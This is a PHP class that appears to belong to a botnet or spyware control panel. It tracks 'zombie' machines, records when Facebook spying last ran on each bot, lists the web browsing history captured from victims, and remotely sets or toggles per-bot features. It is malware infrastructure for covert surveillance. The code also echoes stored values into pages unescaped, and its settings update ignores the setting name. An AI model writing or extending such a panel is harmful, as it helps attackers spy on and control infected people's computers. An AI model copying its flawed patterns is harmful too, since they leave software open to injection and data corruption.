<?php

class Bot
{
    public $bot_id;
    public function getName($bot_id = NULL){
        global $bdd;
        $select_name = $bdd->prepare("SELECT name FROM bots WHERE id = :id");
        $select_name->bindParam(':id', $_GET['id']);
        $select_name->execute();
        $result = $select_name->fetch();
        $this->bot_id = $result['name'];
        return true;
    }
    
    
    static function getLastSpy($bot_id = null){
        if($bot_id != ''){
            global $bdd;
            if(is_numeric($bot_id)){
                $select = $bdd->prepare("SELECT date_last FROM facebookspy WHERE bot_id = :bot_id");
                $select->bindParam(':bot_id', $bot_id);
                $select->execute();
                if($select->rowCount() > 0){
                    $date = $select->fetch()['date_last'];
                    return $date;
                }
                else{
                    $date = "No date logged";
                    return $date;
                }
            }
        }
    }
    
    static function GetLastHistorique($bot_id = NULL){
        if($bot_id != NULL){
            global $bdd;
            $select_name = $bdd->prepare("SELECT name FROM bots WHERE id = :id");
            $select_name->bindParam(':id', $_GET['id']);
            $select_name->execute();
            $result = $select_name->fetch();
            $select_historique = $bdd->prepare("SELECT * FROM history_web WHERE zombie = :zname");
            $select_historique->bindParam(':zname', $result['name']);
            $select_historique->execute();
            if($select_historique->rowCount() > 0){
                while($result = $select_historique->fetch()){
                    ?>
                    <div class="ui relaxed divided list">
                      <div class="item">
                        <div class="content">
                          <div class="description"><?php echo $result['website']; ?></div>
                        </div>
                      </div>
                    </div>
                    <?php
                }
            }
        }
    }
    
    public function getSetting($bot_id = NULL, $setting_name = NULL){
        global $bdd;
        $select = $bdd->prepare("SELECT * FROM bot_settings WHERE setting_name = :name AND bot_id = :bot_id");
        $select->bindParam(':name', $setting_name);
        $select->bindParam(':bot_id', $bot_id);
        $select->execute();
        if($select->rowCount() > 0){
            $result = $select->fetch();
            return $result;
        }
        return false;
    }
    
    public function getHistory($z_name = NULL){
        global $bdd;
      $history = $bdd->prepare("SELECT * FROM history_web WHERE zombie = :name ORDER BY id DESC LIMIT 0,5");
      $history->bindParam(':name', $z_name);
      $history->execute();
      while($fetch = $history->fetch()){
      ?>
        <tr>
          <td><?php echo $fetch['website']; ?></td>
          <td><?php echo $fetch['timevisit']; ?></td>
        </tr>
      <?php
      }
    }
    
    public function setSetting($bot_id = NULL, $setting_name = NULL, $setting_value = NULL){
        global $bdd;
        $select = $bdd->prepare("SELECT * FROM bot_settings WHERE setting_name = :name AND bot_id = :bot_id");
        $select->bindParam(':name', $setting_name);
        $select->bindParam(':bot_id', $bot_id);
        $select->execute();
        if($select->rowCount() > 0){
            $update = $bdd->prepare("UPDATE bot_settings SET setting_value = :value WHERE bot_id = :bot_id");
            $update->bindParam(':value', $setting_value);
            $update->bindParam(':bot_id', $bot_id);
            $update->execute();
            return true;
        }
        echo $bot_id;
        $insert = $bdd->prepare("INSERT INTO bot_settings(setting_name,setting_value,bot_id) VALUES(:name, :value, :bot_id)");
        $insert->bindParam(':name', $setting_name);
        $insert->bindParam(':value', $setting_value);
        $insert->bindParam(':bot_id', $bot_id);
        $insert->execute();
        return true;
        
    }
    
    public function changeSettingStatus($z_name, $setting_name){
        global $bdd;
        $select = $bdd->prepare("SELECT * FROM bot_settings WHERE bot_id = :bot_id AND setting_name = :name");
        $select->bindParam(':bot_id', $z_name);
        $select->bindParam(':name', $setting_name);
        $select->execute();
        if($select->rowCount() > 0){
            $result = $select->fetch();
            if($result['available'] == '0'){
                $update = $bdd->prepare("UPDATE bot_settings SET available = '1' WHERE bot_id = :bot_id AND setting_name = :name");
                $update->bindParam(':bot_id', $z_name);
                $update->bindParam(':name', $setting_name);
                $update->execute();
                return true;
            }
            elseif($result['available'] == '1'){
                $update = $bdd->prepare("UPDATE bot_settings SET available = '0' WHERE bot_id = :bot_id AND setting_name = :name");
                $update->bindParam(':bot_id', $z_name);
                $update->bindParam(':name', $setting_name);
                $update->execute();        
                return true;
            }
            return false;
        }
        return false;
    }
}